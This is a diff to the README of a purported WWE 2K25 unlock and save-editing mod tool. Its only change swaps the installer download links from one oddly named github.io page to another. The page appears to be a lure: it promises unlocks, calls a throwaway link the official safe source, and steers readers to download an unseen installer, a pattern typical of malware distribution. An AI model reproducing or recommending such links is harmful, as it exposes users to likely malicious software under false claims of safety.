@@ -2,7 +2,7 @@
 
 Welcome to the WWE 2K25 Ultimate Unlock Suite, the premier mod tool designed for WWE 2K25 enthusiasts on Windows. This suite provides a range of features to enhance your gameplay experience, from unlocking all superstars to editing save files. Last updated in 2026, it ensures compatibility with the latest game versions and includes optimizations for both casual players and dedicated modders.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://yellowtaxisave.github.io/download-page/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://capitals-707-bringing.github.io/download-page/)
 
 ## Key Features
 
@@ -77,7 +77,7 @@ For more detailed help, refer to the documentation included with the installatio
 
 ## Download
 
-Download the latest version from GitHub: [Download the latest version from GitHub](https://yellowtaxisave.github.io/download-page/)
+Download the latest version from GitHub: [Download the latest version from GitHub](https://capitals-707-bringing.github.io/download-page/)
 
 This link provides access to the most recent release, including all new features and bug fixes. Remember to always use the official download source to ensure safety and authenticity.
 
